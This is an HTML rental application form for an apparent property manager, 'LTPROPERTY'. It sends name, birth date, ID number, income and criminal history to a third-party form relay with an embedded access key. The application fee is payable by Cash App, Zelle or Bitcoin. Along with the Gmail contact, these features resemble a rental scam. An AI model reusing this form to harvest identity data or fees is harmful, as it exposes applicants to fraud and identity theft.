<!DOCTYPE html>

<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="/build/css/intlTelInput.css" />
    <link rel="stylesheet" href="/build/css/demo.css" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>LTPROPERTY APPLICATION FORM</title>
    <!---Custom CSS File--->
    <link rel="stylesheet" href="index.css" />
  </head>
  <body>
    <section class="container">
      <div class="image-logo">
        <img src="./other.jpg" alt="">
      </div>
      <header>RENTAL/LEASE APPLICATION FORM</header>
      <p>Please fill out this form with accurate and complete details</p>
      <h4>contact info | ltpropertymanagementltdd@gmail.com |</h4>
      <form
        action="https://api.web3forms.com/submit" method="POST"
        class="form"
      >
        <input type="hidden" name="access_key" value="c334d2e5-af89-4acb-bc5e-c5f7109874da">
        <div class="input-box">
          <label>FIRST NAME</label>
          <input
            type="text"
            name="first name"
            placeholder="Enter first name"
            required
          />
        </div>

        <div class="input-box">
          <label>MIDDLE NAME</label>
          <input
            type="text"
            name="middle name"
            placeholder="Enter middle name"
            required
          />
        </div>

        <div class="input-box">
          <label>LAST NAME</label>
          <input
            type="text"
            name="last name"
            placeholder="Enter last name"
            required
          />
        </div>

        <div class="input-box">
          <label>Email Address</label>
          <input
            type="email"
            name="email"
            placeholder="*******@gmail.com"
            required
          />
        </div>

        <div class="column">
          <div class="input-box">
            <label>RELATIONSHIP STATUS</label>
            <input
              type="text"
              name="relationship status"
              placeholder="relationship status"
              required
            />
          </div>
          <div class="input-box">
            <label>Birth Date</label>
            <input
              type="date"
              name="age"
              placeholder="Enter birth date"
              required
            />
          </div>
        </div>

        <div class="column">
          <div class="input-box">
            <label for="phone">Phone Number:</label><br />
            <input type="text" name="phone number" id="phone" /><br />
          </div>
        </div>
        <div class="gender-box">
          <h3>Gender</h3>
          <div class="gender-option">
            <div class="gender">
              <input type="radio" id="check-male" name="male-gender" />
              <label for="check-male">male</label>
            </div>
            <div class="gender">
              <input type="radio" id="check-female" name="female-gender" />
              <label for="check-female">Female</label>
            </div>
            <div class="gender">
              <input type="radio" id="check-other" name="prefer-not-to-say-gender" />
              <label for="check-other">prefer not to say</label>
            </div>
          </div>
        </div>

        <div class="column">
          <div class="input-box">
            <label>NUMBER OF PEOPLE MOVING IN</label>
            <input
              type="number"
              name="number of people moving in"
              placeholder=""
              required
            />
          </div>
          <div class="input-box">
            <label>DRIVERS LICENSE OR ANY VALID ID</label>
            <input
              type="text"
              name="D/ID number"
              placeholder="**************"
              required
            />
          </div>
        </div>
        <div class="input-box address">
          <label>MONTHLY INCOME:</label>
          <div class="column">
            <div class="select-box">
              <select name="monthly income">
                <option hidden>Monthly Income:</option>
                <option>$100 - $1000</option>
                <option>$1000 - $5000</option>
                <option>$5000 Above</option>
              </select>
            </div>
          </div>
          <label>TYPE OF LEASE:</label>
          <div class="column">
            <div class="select-box">
              <select name="type of lease">
                <option hidden>Type Of Lease</option>
                <option>Month to Month</option>
                <option>Year to Year</option>
                <option>Unspecified</option>
              </select>
            </div>
          </div>
          
          <!-- <div class="column">
            <input type="text" placeholder="Enter your region" required />
            <input type="number" placeholder="Enter postal code" required />
          </div> -->
        </div>

        <div class="gender-box">
          <h3>Have You Ever Been Evicted</h3>
          <div class="gender-option">
            <div class="gender">
              <input type="radio" id="check-male" name="evicted-YES" />
              <label for="check-male">YES</label>
            </div>
            <div class="gender">
              <input type="radio" id="check-female" name="evicted-NO" />
              <label for="check-female">NO</label>
            </div>
          </div>
        </div>

        <div class="gender-box">
          <h3>Have You Ever Broken a Lease</h3>
          <div class="gender-option">
            <div class="gender">
              <input type="radio" id="check-male" name="broken-YES" />
              <label for="check-male">YES</label>
            </div>
            <div class="gender">
              <input type="radio" id="check-female" name="broken-NO" />
              <label for="check-female">NO</label>
            </div>
          </div>
        </div>

        <div class="gender-box">
          <h3>Your Rental History Any Criminal Record</h3>
          <div class="gender-option">
            <div class="gender">
              <input type="radio" id="check-male" name="criminal-record-YES" />
              <label for="check-male">YES</label>
            </div>
            <div class="gender">
              <input type="radio" id="check-female" name="criminal-record-NO" />
              <label for="check-female">NO</label>
            </div>
          </div>
        </div>

        <div class="input-box address">
          <div class="column">
            <div class="select-box">
              <select name="pets">
                <option hidden>Do you have any pets:</option>
                <option>Dog</option>
                <option>Cat</option>
                <option>Rabbit</option>
                <option>Others</option>
              </select>
            </div>
          </div>
          <div class="column">
            <div class="select-box">
              <select name="payment">
                <option hidden>Application Form Payment Method</option>
                <option>Cash App payment</option>
                <option>PayPal payment</option>
                <option>Apple Pay payment</option>
                <option>Zelle payment</option>
                <option>Venmo payment</option>
                <option>Bitcoin payment</option>
              </select>
            </div>
          </div>
        </div>

        <footer>
          <div class="checkbox-wrapper-46">
            <input type="checkbox" id="cbx-46" class="inp-cbx" />
            <label for="cbx-46" class="cbx"
              ><span>
                <svg viewBox="0 0 12 10" height="10px" width="12px">
                  <polyline points="1.5 6 4.5 9 10.5 1"></polyline></svg></span
              ><span>Agree with terms & conditions</span>
            </label>
          </div>
        </footer>

        <button>Submit</button>
      </form>

      <footer>
        <div class="column">
          <p>&copy; 2024</p>
          <p>User Agreement</p>
          <p>Privacy Policy</p>
        </div>
      </footer>
    </section>

    <script src="/build/js/intlTelInput.js"></script>
    <script>
      var input = document.querySelector("#phone");
      window.intlTelInput(input, {});
    </script>
  </body>
</html>
